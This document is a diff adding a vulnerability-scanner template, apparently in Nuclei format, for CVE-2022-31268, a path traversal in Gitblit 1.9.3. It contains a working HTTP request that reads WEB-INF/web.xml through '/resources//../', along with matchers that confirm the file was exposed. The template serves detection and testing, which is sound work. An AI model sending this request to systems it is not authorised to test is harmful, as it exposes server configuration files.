@@ -1,0 +1,32 @@
+id: cve-2022-31268
+info:
+  name: Gitblit 1.9.3 Path Traversal
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Gitblit version 1.9.3 has a security vulnerability that stems from a path traversal issue. Attackers can use this vulnerability to read website files such as web.xml.
+  reference:
+    - https://github.com/metaStor/Vuls/blob/main/gitblit/gitblit%20V1.9.3%20path%20traversal/gitblit%20V1.9.3%20path%20traversal.md
+  classification:
+    cvss-score: 7.5
+    cve-id: CVE-2022-31268
+  tags: directory-traversal
+http:
+  - raw:
+      - |
+        GET /resources//../WEB-INF/web.xml HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "</web-app>"
+          - "java.sun.com"
+      - type: word
+        part: header
+        words:
+          - "application/xml"
